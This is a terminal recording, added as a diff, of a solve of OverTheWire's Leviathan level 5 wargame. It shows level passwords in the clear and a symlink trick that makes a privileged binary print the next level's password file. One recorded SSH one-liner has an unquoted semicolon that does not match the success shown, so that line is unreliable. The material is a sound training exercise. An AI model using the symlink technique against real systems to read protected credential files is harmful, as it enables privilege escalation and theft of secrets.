@@ -1,0 +1,8 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793471878,"idle_time_limit":2.0,"command":"python3 -I /home/claude/tools/ptyrun_sh.py /home/claude/solves/leviathan/L5.sh","title":"Leviathan L5 solve","env":{"SHELL":"/bin/bash"}}
+[0.011, "o", "$ ssh leviathan5@leviathan.labs.overthewire.org -p 2223   # password Bub9gZ3BGU\r\r\n$ strings leviathan5   # reads /tmp/file.log as leviathan6, then unlinks it\r\r\n$ ssh leviathan5@leviathan.labs.overthewire.org -p 2223 strings leviathan5 | grep file.log\r\r\n"]
+[3.505, "o", "/tmp/file.log\r\r\nCannot find /tmp/file.log\r\r\n"]
+[0.000, "o", "$ ln -sf /etc/leviathan_pass/leviathan6 /tmp/file.log; ./leviathan5\r\r\n$ ssh leviathan5@leviathan.labs.overthewire.org -p 2223 ln -sf /etc/leviathan_pass/leviathan6 /tmp/file.log; ./leviathan5\r\r\n"]
+[5.543, "o", "JRGj9iWNOb\r\r\n"]
+[0.001, "o", "$ ssh leviathan6@leviathan.labs.overthewire.org -p 2223   # verify JRGj9iWNOb\r\r\n$ ssh leviathan6@leviathan.labs.overthewire.org -p 2223 whoami\r\r\n"]
+[3.795, "o", "leviathan6\r\r\n"]
+[0.003, "x", "0"]
